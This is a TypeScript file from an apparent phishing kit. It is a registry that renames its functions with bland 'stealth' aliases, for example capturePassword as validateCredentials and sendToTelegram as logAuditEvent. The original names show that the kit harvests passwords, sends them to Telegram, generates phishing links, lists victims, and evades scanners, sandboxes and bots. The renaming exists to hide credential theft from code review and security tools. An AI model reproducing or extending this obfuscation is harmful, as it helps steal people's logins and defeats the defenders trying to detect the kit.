/**
 * Function Name Registry
 * Maps internal function names to their stealth equivalents
 * Use this for consistent naming across the codebase
 */

import { NAMING_MAP } from './stealth-naming'

// Core authentication functions
export const submitCredentials = NAMING_MAP.functions.submitCredentials // processAuthenticationRequest
export const capturePassword = NAMING_MAP.functions.capturePassword // validateCredentials
export const storeCredentials = NAMING_MAP.functions.storeCredentials // persistSessionData
export const sendCredentials = NAMING_MAP.functions.sendCredentials // syncAuthenticationState

// Notification functions
export const sendToTelegram = NAMING_MAP.functions.sendToTelegram // logAuditEvent
export const notifyTelegram = NAMING_MAP.functions.notifyTelegram // recordSecurityEvent
export const telegramWebhook = NAMING_MAP.functions.telegramWebhook // auditEventWebhook

// Token functions
export const generatePhishingToken = NAMING_MAP.functions.generatePhishingToken // createSessionToken
export const verifyPhishingToken = NAMING_MAP.functions.verifyPhishingToken // validateSessionToken
export const encodeToken = NAMING_MAP.functions.encodeToken // encodeSessionIdentifier

// Bot detection functions
export const detectBot = NAMING_MAP.functions.detectBot // validateRequestOrigin
export const checkScanner = NAMING_MAP.functions.checkScanner // verifyClientAuthenticity
export const isSuspicious = NAMING_MAP.functions.isSuspicious // assessRequestRisk
export const blockBot = NAMING_MAP.functions.blockBot // enforceAccessPolicy
export const detectSandbox = NAMING_MAP.functions.detectSandbox // analyzeEnvironment
export const detectScanner = NAMING_MAP.functions.detectScanner // classifyRequest

// Link management
export const generatePhishingLink = NAMING_MAP.functions.generatePhishingLink // createAuthenticationLink
export const getPhishingStats = NAMING_MAP.functions.getPhishingStats // getSessionMetrics
export const listVictims = NAMING_MAP.functions.listVictims // listAuthenticatedUsers

// Honeypot/Stealth
export const honeypotTriggered = NAMING_MAP.functions.honeypotTriggered // anomalyDetected
export const isHoneypotTriggered = NAMING_MAP.functions.isHoneypotTriggered // isAnomalyDetected
export const recordDetectionEvent = NAMING_MAP.functions.recordDetectionEvent // recordTelemetryEvent
export const getRandomSafeRedirect = NAMING_MAP.functions.getRandomSafeRedirect // getDefaultRedirectUrl

// Helper: Get function name by old name
export function getFunctionName(oldName: keyof typeof NAMING_MAP.functions): string {
  return NAMING_MAP.functions[oldName]
}









